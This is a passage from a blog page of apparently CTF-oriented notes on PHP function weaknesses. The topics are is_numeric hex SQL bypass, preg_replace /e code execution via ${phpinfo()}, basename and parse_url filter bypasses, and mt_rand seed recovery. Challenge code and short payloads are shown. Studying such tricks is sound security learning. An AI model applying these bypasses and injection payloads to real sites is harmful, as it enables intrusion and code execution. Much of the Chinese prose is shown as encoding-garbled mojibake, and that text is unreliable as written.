class="line">ä¸Šé¢è¿™ä¸ªç‰‡æ®µç¨‹åºæ˜¯åˆ¤æ–­å‚æ•°sæ˜¯å¦ä¸ºæ•°å­—ï¼Œæ˜¯åˆ™è¿”å›æ•°å­—ï¼Œä¸æ˜¯åˆ™è¿”å›<span class="number">0</span>ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ï¼ˆè¿™æ ·å°±æ„é€ ä¸äº†sqlè¯­å¥ï¼‰</span><br><span class="line">æˆ‘ä»¬å¯ä»¥æŠŠâ€˜<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="string">&#x27; è½¬æ¢ä¸º16è¿›åˆ¶ 0x31206f722031 ä¸ºså‚æ•°çš„å€¼</span></span><br><span class="line"><span class="string">l</span></span><br></pre></td></tr></table></figure><h2 id="array-search-x2F-in-array"><a href="#array-search-x2F-in-array" class="headerlink" title="array_search&#x2F;in_array"></a>array_search&#x2F;in_array</h2><blockquote><p>å¤§æµ·æé’ˆï¼Œåœ¨å¤§æµ·ï¼ˆ<code>haystack</code>ï¼‰ä¸­æœç´¢é’ˆï¼ˆ <code>needle</code>ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® <code>strict</code> åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒã€‚</p></blockquote><p>å‚æ•°ï¼š(<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$needle</code>, array <code>$haystack</code>, bool <code>$strict</code> &#x3D; <strong><code>false</code></strong>): bool</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å½“æ¨¡å¼ä¸º<span class="literal">false</span>æ—¶ï¼Œå…¶æŸ¥æ‰¾æ˜¯é€šè¿‡==æ¥æ¯”è¾ƒçš„</span><br><span class="line"></span><br><span class="line">å½“æ¨¡å¼ä¸º<span class="literal">true</span>æ—¶ï¼Œå…¶æŸ¥æ‰¾æ˜¯é€šè¿‡===æ¥æ¯”è¾ƒçš„</span><br></pre></td></tr></table></figure><h2 id="escapeshellargå’Œescapeshellcmd"><a href="#escapeshellargå’Œescapeshellcmd" class="headerlink" title="escapeshellargå’Œescapeshellcmd"></a>escapeshellargå’Œescapeshellcmd</h2><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p><p><a href="https://www.anquanke.com/post/id/107336">https://www.anquanke.com/post/id/107336</a></p><h2 id="preg"><a href="#preg" class="headerlink" title="preg"></a>preg</h2><h4 id="preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰"><a href="#preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰" class="headerlink" title="preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰"></a>preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰</h4><blockquote><p>**preg_match()<strong>è¿”å› <code>pattern</code> çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸º</strong>preg_match()**åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚</p></blockquote><p>æ¼æ´</p><p>1.å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œä¼ é€’æ•°ç»„è¿”å›false</p><p>2.<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">åˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡</a></p><p>phpä½ç‰ˆæœ¬</p><p>2.é&#x2F;sæ¨¡å¼ä¸‹ä¸åŒ¹é…æ¢è¡Œç¬¦%0a<br>3.é&#x2F;mæ¨¡å¼ä¸‹ä¸åŒ¹é…å¤šè¡Œ</p><h4 id="preg-replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰"><a href="#preg-replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰" class="headerlink" title="preg_replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰"></a>preg_replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰</h4><ol><li><p>æ›¿æ¢æ¬¡æ•°é»˜è®¤ä¸º1ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡</p></li><li><p>&#x2F;eæ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ ï¼ˆphp5.5ç‰ˆæœ¬ä»¥ä¸‹ï¼‰</p></li></ol><p>buuâ€“[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"><span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>.<span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;eæ¨¡å¼ä¸‹ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±ä¼šæ‰§è¡Œpreg_replace()çš„ç¬¬äºŒä¸ªå‚æ•°</p><p>ç›¸å½“äº <strong>eval(â€˜strtolower(â€œ\1â€);â€™)</strong> </p><p>å¦‚ä½•åˆ©ç”¨\1å®ç°ä»£ç æ‰§è¡Œå‘¢ï¼Ÿ</p><p>æ³¨æ„åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ‰€ä»£è¡¨çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ˜¯å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä½œä¸ºæ•è·åˆ†ç»„ï¼Œè€Œæ•è·åˆ†ç»„ä¸‹æ ‡æ˜¯ä»1å¼€å§‹çš„ï¼Œå³åŒ¹é…åˆ°çš„å­—ç¬¦ä¼šä»£æ›¿\1â†’<strong>eval(â€˜strtolower(â€œpayloadâ€);â€™)</strong> </p><p><img src="file://E:\typora%20img\image-20220706125956030.png?lastModify=1657113567" alt="image-20220706125956030"></p><p>è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹æ˜¯â€payloadâ€æ˜¯ç”±åŒå¼•å·åŒ…å›´èµ·æ¥çš„ï¼Œå†é…åˆå¯å˜å˜é‡ï¼Œæ‰èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125; </span><br><span class="line"></span><br><span class="line">\S*â†’<span class="variable">$regex</span> ç”¨äºæ­£åˆ™åŒ¹é…/æ•è·</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;â†’<span class="variable">$value</span> å¾…åŒ¹é…å­—ç¬¦</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;:è¦å°†å¾…åŒ¹é…å­—ç¬¦æ„é€ æˆå¯å˜å˜é‡çš„å½¢å¼æ‰å¯ä»¥æ‰§è¡Œ<span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line">å¯å˜å˜é‡ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt; hello world</span><br></pre></td></tr></table></figure><h2 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h2><p><strong>basenameä¼šå¿½ç•¥ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦<code>%80 ~ %ff</code>ã€‚</strong></p><p>buu â€”-[Zer0pts2020]Can you guess it?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;config\.php\/*$&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡ï¼šbasename($_SERVER[â€˜PHP_SELFâ€™]&#x3D;&#x3D;config.php</p><ol><li>éœ€è¦ç»•è¿‡è¿‡æ»¤config.php/*$ï¼Œ$åŒ¹é…æœ«å°¾ï¼Œæ‰€ä»¥åªè¦åœ¨config.phpåæ·»åŠ å­—ç¬¦å³å¯ç»•è¿‡ã€‚</li><li>$_SERVER[â€˜PHP_SELFâ€™]ï¼šè¿”å›çš„æ˜¯å½“å‰æ–‡ä»¶ç›¸å¯¹äºæ ¹ç›®å½•çš„è·¯å¾„host&#x2F;$_SERVER[â€œPHP_SELFâ€]å³url&#x3D;&#x3D;host&#x2F;$_SERVER[â€œPHP_SELFâ€]</li><li>basenameï¼šè¿”å›å½“å‰æ–‡ä»¶åå³æœ€åä¸€ä¸ª&#x2F;xxxä¸­çš„xxx</li></ol><p><img src="/../images/image-20220706205913114-1687432076955.png" alt="image-20220706205913114"></p><p>ä¸ºäº†ç»•è¿‡æ­£åˆ™ï¼Œéœ€è¦åœ¨1.phpååŠ å­—ç¬¦</p><p><img src="/../images/image-20220706210043797-1687432076955.png" alt="image-20220706210043797"></p><p>ä½†æ˜¯è¿™æ ·basenameåŒ¹é…åˆ°çš„å°±ä¸æ˜¯1.phpäº†</p><p>ä¸è¿‡basenameæœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯ï¼šå¦‚æœåŒ¹é…åˆ°çš„æ–‡ä»¶åå¤´æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¼šæŠŠå®ƒå¿½ç•¥æ‰</p><p><img src="/../images/image-20220706210252351-1687432076955.png" alt="image-20220706210252351"></p><p>è¿™æ ·basenameåŸå…ˆåŒ¹é…åˆ°çš„æ˜¯%81ï¼Œä½†æ˜¯%81æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¼šæŠŠå®ƒå¿½ç•¥æ‰ï¼Œæ‰€ä»¥å°±ä¼šå¾€å‰åŒ¹é…ï¼ŒåŒ¹é…åˆ°1.php</p><p><img src="/../images/image-20220706210555229-1687432076955.png" alt="image-20220706210555229"></p><h2 id="ä¼ªéšæœºæ•°"><a href="#ä¼ªéšæœºæ•°" class="headerlink" title="ä¼ªéšæœºæ•°"></a>ä¼ªéšæœºæ•°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand(x):è®¾å®šéšæœºæ•°ç§å­ä¸ºx</span><br><span class="line">mt_rand(a,b):ç”Ÿæˆ[a,b]é—´çš„éšæœºæ•°</span><br></pre></td></tr></table></figure><p>éšæœºæ•°ç”Ÿæˆå‡½æ•°ï¼Œå®è´¨ä¸Šç”Ÿæˆçš„æ˜¯çº¿æ€§çš„ä¼ªéšæœºæ•°ï¼Œç®€å•æ¥è¯´å°±æ˜¯y&#x3D;axï¼Œxå°±æ˜¯ç§å­ï¼Œaæ˜¯èŒƒå›´ï¼Œyå°±æ˜¯ç”Ÿæˆçš„éšæœºæ•°ã€‚</p><p>æ‰€ä»¥åªè¦ç§å­å›ºå®šäº†ï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ç›¸åŒçš„ã€‚</p><ol><li><p>å·²çŸ¥åœ¨åŒä¸€ä¸ªç§å­ä¸‹ç”Ÿæˆçš„å¤šä¸ªéšæœºæ•°</p><p><a href="https://blog.csdn.net/weixin_34255793/article/details/92713300">https://blog.csdn.net/weixin_34255793/article/details/92713300</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨php_mt_seedå¯¹ç¬¬ä¸€ä¸ªéšæœºæ•°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯èƒ½çš„ç§å­ï¼ˆå› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨mt_rand()å‡½æ•°çš„æ—¶å€™ç§å­å°±ç¡®å®šä¸‹æ¥äº†ï¼‰</span><br><span class="line">ç„¶åç”¨å¾—åˆ°çš„ç§å­æ¥ç”Ÿæˆéšæœºæ•°ï¼Œè¿›è¡Œæ¯”å¯¹å³å¯å¾—åˆ°æ­£ç¡®çš„ç§å­</span><br></pre></td></tr></table></figure></li><li><p>å·²çŸ¥ç¬¬ä¸€ä¸ªéšæœºæ•°</p><p><a href="https://blog.csdn.net/qq_52907838/article/details/119824220">https://blog.csdn.net/qq_52907838/article/details/119824220</a></p><p>php_mt_seedä¸­ç»™å‡ºçš„æ–¹æ³•</p><p><img src="/../images/image-20220708120301114-1687432076956.png" alt="image-20220708120301114"></p><p>å¯¹åº”è„šæœ¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;Unclt9Kr75&quot;</span>;<span class="comment">//ç¬¬ä¸€ä¸ªéšæœºæ•°çš„å‰åä½</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;<span class="comment">//å®Œæ•´çš„éšæœºæ•°</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$length</span>-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$a</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220708120520631-1687432076956.png" alt="image-20220708120520631"></p><p>å…³äºphp_mt_seed <a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p><h2 id="SERVERå˜é‡ç¼ºé™·"><a href="#SERVERå˜é‡ç¼ºé™·" class="headerlink" title="$_SERVERå˜é‡ç¼ºé™·"></a>$_SERVERå˜é‡ç¼ºé™·</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER[QUERY_STRING]  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220717130225205-1687432076956.png" alt="image-20220717130225205"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]ï¼šè¿”å›çš„æ˜¯å½“å‰æ–‡ä»¶ç›¸å¯¹äºæ ¹ç›®å½•çš„è·¯å¾„host/$_SERVER[&quot;PHP_SELF&quot;]å³url==host/$_SERVER[&quot;PHP_SELF&quot;]</span><br></pre></td></tr></table></figure><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h2><p>ä½¿ç”¨æ–¹æ³•</p><blockquote><p>ç”¨äºè§£æurlï¼Œè·å¾—urlçš„ç»„æˆéƒ¨åˆ†</p></blockquote><p><img src="/../images/image-20220204213349476-1687432076956.png" alt="image-20220204213349476"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.zcool.com.cn/suning?p=69#tab_anchor&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$parts</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">http:<span class="comment">//www.zcool.com.cn/suning?p=69#tab_anchor&lt;/br&gt;array(5) &#123;</span></span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;www.zcool.com.cn&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;/suning&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;p=69&quot;</span></span><br><span class="line">  [<span class="string">&quot;fragment&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;tab_anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´</p><blockquote><p>ä¸åº”è¯¥å°†å…¶ä½œä¸ºæ£€éªŒurlæ˜¯å¦åˆæ³•çš„æ‰‹æ®µ</p></blockquote><ol><li><p>è§£æå¤±è´¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/test/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filter</span>=<span class="keyword">array</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;qqqq&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;query&#x27;</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807105935728-1687432076957.png" alt="image-20220807105935728"></p><blockquote><p>æˆ‘ä»¬æŸ¥è¯¢çš„å­—ç¬¦ä¸²è¢«æ‹¦æˆªï¼Œæ²¡æœ‰è¾“å‡ºa&#x3D;1</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1///test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807111314350-1687432076957.png" alt="image-20220807111314350"></p><blockquote><p>åœ¨æ­£å¸¸è·¯å¾„å‰åŠ ä¸Š&#x2F;&#x2F;ï¼Œparse_urlå°±ä¼šè§£æå¤±è´¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ï¼ŒæˆåŠŸè¾“å‡ºa&#x3D;1</p></blockquote></li><li><p>ç«¯å£è§£æé”™è¯¯</p><blockquote><p>php5.5ä»¥ä¸Š</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;//pupiles.com/about:1234&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1234</span>)</span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>parse_urlè§£æå‡ºäº†ç«¯å£å·ï¼Œè®¤ä¸ºè®¿é—®çš„æ˜¯pupiles.comçš„1234ç«¯å£ä¸‹çš„about:1234æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šæ˜¯è®¿é—®pupiles.comä¸‹çš„about:1234æ–‡ä»¶</p></blockquote></li><li><p>è·¯å¾„è§£æé”™è¯¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;/upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// doubleslash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;//upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [path] =&gt; /upload</span><br><span class="line">)</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [host] =&gt; upload</span><br><span 